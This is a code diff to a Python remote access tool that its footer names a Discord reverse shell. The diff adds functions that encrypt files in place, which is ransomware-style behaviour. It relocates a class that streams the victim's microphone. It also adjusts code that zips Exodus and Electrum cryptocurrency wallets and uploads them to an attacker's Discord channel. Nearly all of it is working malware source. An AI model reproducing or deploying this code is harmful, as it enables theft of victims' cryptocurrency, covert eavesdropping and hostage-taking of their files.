@@ -90,14 +90,6 @@ freezed = False
 #opus_path = os.path.join(os.path.dirname(sys.argv[0]), "libopus-0.x64.dll")
 #discord.opus.load_opus(opus_path)
 
-class PyAudioPCM(discord.AudioSource):
-    def __init__(self, channels=2, rate=48000, chunk=960, input_device=1):
-        self.chunks = chunk
-        self.stream = pyaudio.PyAudio().open(format=pyaudio.paInt16, channels=channels, rate=rate, input=True, input_device_index=input_device, frames_per_buffer=chunk)
-
-    def read(self):
-        return self.stream.read(self.chunks)
-
 
 
 
@@ -125,6 +117,7 @@ def check_internet():
     except requests.RequestException:
         return False
     
+
 
 commands = "\n".join([
     "help - Help command",
@@ -160,6 +153,36 @@ commands = "\n".join([
 ])
 
 
+
+def encrypt(file, key):
+    if os.path.exists(file):
+        try:
+            content = open(file, "rb").read()
+            encrypted = key.encrypt(content)
+            open(file, "wb").write(encrypted)
+        except: return False
+    else: return False
+    
+def decrypt(file, key):
+    if os.path.exists(file):
+        try:
+            content = open(file, "rb").read()
+            encrypted = key.decrypt(content)
+            open(file, "wb").write(encrypted)
+        except: return False
+    else: return False
+
+
+class PyAudioPCM(discord.AudioSource):
+    def __init__(self, channels=2, rate=48000, chunk=960, input_device=1):
+        self.chunks = chunk
+        self.stream = pyaudio.PyAudio().open(format=pyaudio.paInt16, channels=channels, rate=rate, input=True, input_device_index=input_device, frames_per_buffer=chunk)
+
+    def read(self):
+        return self.stream.read(self.chunks)
+
+
+
 async def wallets(channel):
     USER_DIR = os.path.expanduser("~")
 
@@ -174,9 +197,11 @@ async def wallets(channel):
         exodus_zip.close()
 
         try:
-            with open("Exodus.zip", "rb") as wallet:
-                wallet_zip = discord.File(wallet, filename=os.path.basename(file))
-                await channel.send(file=wallet_zip)
+            #with open("Exodus.zip", "rb") as wallet:
+            #    wallet_zip = discord.File(wallet, filename="Exodus.zip")
+            #    await channel.send(file=wallet_zip)
+            wallet = discord.File("Exodus.zip")
+            await channel.send(file=wallet)
         except:
             embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
             embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
@@ -197,9 +222,11 @@ async def wallets(channel):
         electrum_zip.close()
 
         try:
-            with open("Electrum.zip", "rb") as wallet:
-                wallet_zip = discord.File(wallet, filename=os.path.basename(file))
-                await channel.send(file=wallet_zip)
+            #with open("Electrum.zip", "rb") as wallet:
+            #    wallet_zip = discord.File(wallet, filename="Electrum.zip")
+            #    await channel.send(file=wallet_zip)
+            wallet = discord.File("Electrum.zip")
+            await channel.send(file=wallet)
         except:
             embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
             embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
